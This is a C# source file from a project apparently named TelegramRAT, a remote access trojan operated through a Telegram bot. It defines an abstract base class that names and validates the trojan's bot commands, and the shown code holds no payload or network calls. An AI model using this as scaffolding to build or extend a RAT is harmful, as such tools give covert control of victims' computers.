namespace TelegramRAT.Commands;

public abstract class AbstractBotCommand : IBotCommand
{
    public abstract string Command { get; }
    public virtual string[] Aliases => Array.Empty<string>();
    public abstract string Description { get; }
    public virtual string Example => string.Empty;
    public virtual int ArgsCount => -1;

    public abstract Task ExecuteAsync(BotCommandModel model);

    public virtual bool Validate(BotCommandModel model)
    {
        if (model == null) return false;
        if (!string.Equals(Command, model.Command, StringComparison.OrdinalIgnoreCase) &&
            !Aliases.Contains(model.Command, StringComparer.OrdinalIgnoreCase))
        {
            return false;
        }

        return ArgsCount switch
        {
            -1 => true,
            -2 => model.Args.Length > 0,
            _ => ArgsCount == model.Args.Length
        };
    }
}
